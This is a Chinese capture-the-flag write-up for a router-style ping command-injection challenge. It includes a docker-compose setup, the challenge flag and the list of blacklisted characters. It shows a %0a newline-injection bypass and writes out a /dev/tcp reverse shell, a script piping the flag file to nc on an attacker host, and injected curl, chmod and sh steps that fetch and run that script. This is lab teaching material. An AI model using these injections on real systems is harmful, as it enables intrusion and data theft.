# 命令执行漏洞CTF

## **死亡ping命令**

**题目描述:**

路由器管理台经常存在的网络ping测试，开发者常常会禁用大量的恶意字符串，试试看如何绕过呢？

**docker-compose.yml**

```
version: "3.2"
services:
  converter:
    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-command:latest
    ports:
      - 80:80
```

**启动方式**

docker-compose up -d

**题目Flag**

n1book{6fa82809179d7f19c67259aa285a7729}

**Writeup**

通过测试可以发现是存在一些黑名单过滤的，被拦截时候显示IP包含恶意字符。

利用fuzz的方式能够知道过滤了以下字符:

\["$", "{", "}", "\`", ";", "&", "|", "(", ")", """, "'", "~", "!", "@", "#", "%", "^", "\*", "\[", "\]", "\\", ":", "-", "\_"\];

通过%0a能够注入新的一条命令进行执行。

![](../Images/980417844d3c3b541224e96f7969c47c.png)

由于docker是没有bash、python程序的，并且sh反弹是不行的。

bash -i >& /dev/tcp/127.0.0.1/8080 0>&1

关闭防火墙

新建1.sh文件，内容为：

```
ls
cat /FLAG | nc 192.168.10.3 8080
```

目前是能通过折中的方式执行任意命令

请求bash文件到tmp目录

127.0.0.1%0acurl 192.168.10.3/1.sh > /tmp/1.sh

结果如下

![](../Images/660046f130d5447f60e03a48afeacd8a.png)

给bash加权限

127.0.0.1%0achmod 777 /tmp/1.sh

结果如下

![](../Images/d0085fb79668bed83fabd7441471ad7b.png)

执行bash文件

127.0.0.1%0ash /tmp/1.sh

结果如下

![](../Images/cfa66edffd062a86f15eaa420c379fe7.png)

192.168.10.3机器上进行监听8080端口

nc -l 8080

结果如下

![](../Images/5648fd338ac0a2ed4c57832a0ad19c99.png)

得到flag：n1book{6fa82809179d7f19c67259aa285a7729}
